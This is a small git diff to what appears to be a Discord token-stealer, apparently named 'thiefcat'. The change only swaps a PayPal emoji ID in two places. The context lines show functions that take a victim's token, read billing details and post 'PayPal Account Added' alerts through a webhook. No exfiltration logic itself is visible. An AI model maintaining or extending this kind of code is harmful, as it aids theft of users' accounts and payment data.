@@ -462,7 +462,7 @@ const getBilling = async token => {
           billing.push('💳');
           break;
         case 2:
-          billing.push('<:paypal:1343577728288555078>');
+          billing.push('<:paypal:1343582502824050760>');
           break;
         default:
           billing.push('(Unknown)');
@@ -786,7 +786,7 @@ const PaypalAdded = async (token) => {
       avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
       embeds: [
         {
-          title: '<:paypal:1343577728288555078> PayPal Account Added',
+          title: '<:paypal:1343582502824050760> PayPal Account Added',
           color: 5639644,
           fields: [
             {
